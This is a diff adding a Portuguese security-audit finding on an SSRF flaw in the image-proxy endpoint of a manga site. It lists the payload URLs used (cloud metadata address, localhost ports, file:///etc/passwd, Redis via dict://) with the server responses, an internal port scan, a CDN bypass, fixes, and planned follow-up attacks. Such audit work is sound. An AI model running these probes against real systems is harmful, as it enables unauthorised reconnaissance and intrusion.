@@ -1,0 +1,56 @@
+# F-013 SSRF server-side request forgery em GET /api/proxy/image?url=
+Alvo: kuromangas.com (origin 127.0.0.1:5000 via Cloudflare)
+Severidade: Alta
+Timestamp: 2026-08-20T17:35Z
+
+## Reprodução
+Endpoint `GET /api/proxy/image?url=<URL>` (helper `se()` no bundle: `pe.get("proxy/image",{searchParams:{url:a}}).blob()`).
+Servidor Node.js faz `fetch(url)` server-side e retorna o blob. Exige sessão autenticada
+(conta de teste user id=24829). Respostas de erro vazam detalhes internos da conexão.
+
+Capturas: `webapp/caps/ssrf_*.json`, `webapp/caps/_ssrf_scan.json`, `webapp/caps/ssrf5000_*.json`.
+
+### Output (amostras, status 500 com `details` revelando socket/net)
+- `url=http://169.254.169.254/latest/meta-data/` -> `{"error":"Failed to fetch image","details":"connect ETIMEDOUT 169.254.169.254:80"}` (IMDSv1 não alcançável / bloqueado)
+- `url=http://127.0.0.1/` -> `connect ECONNREFUSED 127.0.0.1:80`
+- `url=http://127.0.0.1:5000/api/health` -> **200**, corpo criptografado `_v_secure` (o backend origin responde!) — bypass do WAF Cloudflare, atingindo o origin diretamente
+- `url=https://kuromangas.com/api/admin/users` -> `Request failed with status code 401` (proxy-to-self; auth ainda exigida)
+- `url=file:///etc/passwd` -> `protocol mismatch` (file:// rejeitado)
+- `url=dict://localhost:6379/INFO` -> `Unsupported protocol dict:` (dict rejeitado)
+
+### Port-scan interno via SSRF (diferença ECONNREFUSED vs ECONNRESET vs hangup)
+- **127.0.0.1:5000** -> serviço HTTP interno ativo (backend API origin; `/api/health` retorna 200)
+- **127.0.0.1:5432** -> `read ECONNRESET` => **PostgreSQL** escutando (porta default PG; rejeita HTTP)
+- **127.0.0.1:6379** -> `socket hang up` => **Redis** escutando (porta default Redis; não-HTTP)
+- demais portas (22,80,443,3000,3306,8080,9000,9200,27017,etc.) -> `ECONNREFUSED` (fechadas)
+- IMDSv1 (169.254.169.254) -> ETIMEDOUT (provável IMDSv2 / rede bloqueada; não explorável)
+
+## Interpretação
+SSRF confirmado: o servidor busca URLs arbitrariamente fornecidas pelo usuário (qualquer
+scheme http/https aceito; file/dict/gopher rejeitados). O erro diferencia ECONNREFUSED
+(porta fechada) de ECONNRESET/hangup (serviço não-HTTP escutando), permitindo **port-scan
+interno cego** e fingerprint de serviços. O SSRF atinge o **origin backend em 127.0.0.1:5000
+diretamente, bypassando Cloudflare** (WAF/managed challenge não protegem o origin contra
+requisições originadas pelo próprio servidor). Auth ainda é exigida (401) no origin, mas a
+topologia interna fica exposta (backend :5000, PostgreSQL :5432, Redis :6379). IMDSv1 e
+file:// não exploráveis.
+
+## Impacto
+- Mapeamento de rede interna + fingerprint de serviços (PostgreSQL, Redis, backend).
+- Bypass do WAF/CDN para atingir o origin (vetor para abusar endpoints internos/privados
+  caso existam rotas só-origin, ou para evadir rate-limit do edge).
+- Potencial acesso a metadata cloud se IMDSv1 estivesse habilitado (não é o caso; ETIMEDOUT).
+- Vetor para ataques adicionais (ex.: CSRF interno, abuso de endpoints admin origin-only
+  caso existam, negação de serviço interno).
+
+## Recomendação
+- Validar/allowlist o `url` (restrito a `cdn.kuromangas.com` e hosts de cover aprovados).
+- Bloquear ranges privados (RFC1918, 127.0.0.0/8, 169.254.0.0/16, ::1) e schemes não-http.
+- Não propagar mensagens de erro internas (ECONNREFUSED/ETIMEDOUT/ECONNRESET) ao cliente.
+- Para o origin em :5000: garantir que rotas internas também validem auth/RBAC (já validado).
+
+## Próximo passo
+- Fuzzing de paths no origin (`127.0.0.1:5000`) via SSRF buscando rotas só-origin (ex.: `/api/internal/*`,
+  `/api/dev/*`, health/debug não-autenticados). Testar se algum endpoint interno ignora auth.
+- Tentar SSRF via redirect-chain (servidor externo retorna 302 -> interno) para bypass de
+  allowlist de host, se allowlist for adicionada.
